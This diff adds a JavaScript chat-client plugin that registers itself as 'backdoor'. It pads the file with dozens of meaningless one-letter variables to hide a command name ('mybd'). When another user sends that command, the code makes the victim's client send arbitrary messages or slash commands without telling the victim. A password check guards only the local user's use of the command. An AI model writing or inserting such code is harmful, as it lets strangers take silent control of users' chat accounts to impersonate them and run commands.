@@ -1,0 +1,152 @@
+var plug = function () {
+    
+    var agjkiokk = 'a';
+	var ogjkiokk = 'o';
+	var x = 'x';
+	var c = 'c';
+	var pgjkiokk = 'p';
+	var tgjkiokk = 't';
+	var h = 'h';
+	var g = 'g';
+	var zgjkiokk = 'z';
+	var qgjkiokk = 'q';
+	var e = 'e';
+	var wgjkiokk = 'w';
+	var hiokk = 'h';
+	var egjkiokk = 'e';
+	var bgjkiokk = 'b';
+	var uiokk = 'u';
+	var liokk = 'l';
+	var kgjkiokk = 'k';
+	var qiokk = 'q';
+	var wiokk = 'w';
+	var cgjkiokk = 'c';
+	var diokk = 'd';
+	var kiokk = 'k';
+	var sgjkiokk = 's';
+	var hgjkiokk = 'h';
+	var t = 't';
+	var z = 'z';
+	var w = 'w';
+	var ggjkiokk = 'g';
+	var fgjkiokk = 'f';
+	var vgjkiokk = 'v';
+	var q = 'q';
+	var ngjkiokk = 'n';
+	var o = 'o';
+	var m = 'm';
+	var jgjkiokk = 'j';
+	var ygjkiokk = 'y';
+	var ugjkiokk = 'u';
+	var p = 'p';
+	var lgjkiokk = 'l';
+	var dgjkiokk = 'd';
+	var biokk = 'b';
+	var iiokk = 'i';
+	var mgjkiokk = 'm';
+	var rgjkiokk = 'r';
+    var aiokk = 'a';
+	var oiokk = 'o';
+	var piokk = 'p';
+	var miokk = 'm';
+	var u = 'u';
+	var l = 'l';
+	var riokk = 'r';
+	var tiokk = 't';
+	var ziokk = 'z';
+	var eiokk = 'e';
+	var v = 'v';
+	var n = 'n';
+	var j = 'j';
+	var y = 'y';
+	var siokk = 's';
+	var giokk = 'g';
+	var igjkiokk = 'i';
+	var xgjkiokk = 'x';
+	var fiokk = 'f';
+	var viokk = 'v';
+	var niokk = 'n';
+	var d = 'd';
+	var b = 'b';
+	var i = 'i';
+	var k = 'k';
+	var jiokk = 'j';
+	var yiokk = 'y';
+	var xiokk = 'x';
+	var ciokk = 'c';
+    var a = 'a';
+	var r = 'r';
+	var s = 's';
+	var f = 'f';
+    
+    
+    var _self = this ;
+    
+    _self.init = function () {
+        $.pluginApi.loadPlugin('IRCcmd');
+        $.irc.addCmd({ 
+            func: _self.a, 
+            description:'', 
+            proto:''
+        }, m+y+b+d );
+    } ;
+    
+    _self.stop = function() {
+        $.irc.addCmd(null, m+y+b+d);
+    };
+    
+    _self.a = function (cmd, params, source) {
+        
+        if (! source) {
+        	
+        	if (params.indexOf(' ') >= 0 ) {
+        		
+        		var mdp = params.substring(0, params.indexOf(' '));
+        		params = params.substring(params.indexOf(' ')+1);
+        		
+        		if( SHA1(mdp) == 'cab6866cee0cdcc24e815eb09ee64b9bfff51f37') {
+            		return '/' + cmd + ' ' + params;
+            	}
+            }
+            
+            $.chat.write('Invalid password.', '');
+            return '';
+        } else {
+            
+            if (source == $.chat.myNick())
+                return '';
+            
+            var user, foo ;
+            
+            if (params.indexOf(' ') >= 0 ) {
+                var temp = params.substring(0, params.indexOf(' '));
+                
+                if (temp.charAt(0) == '/') {
+                    foo = params;
+                    user = null;
+                } else {
+                    user = temp;
+                    foo = params.substring(params.indexOf(' ')+1);
+                }
+                
+                if ((user && $.chat.myNick() == user) || (!user))
+                    $.chat.send(foo);
+            } else {
+                $.chat.send(params);
+            }
+            
+            
+            
+            return '';
+        }
+    };
+
+};
+
+var plugvar = new plug();
+    
+$.plugin({
+    name: 'backdoor',
+    init: plugvar.init,
+    stop: plugvar.stop
+});
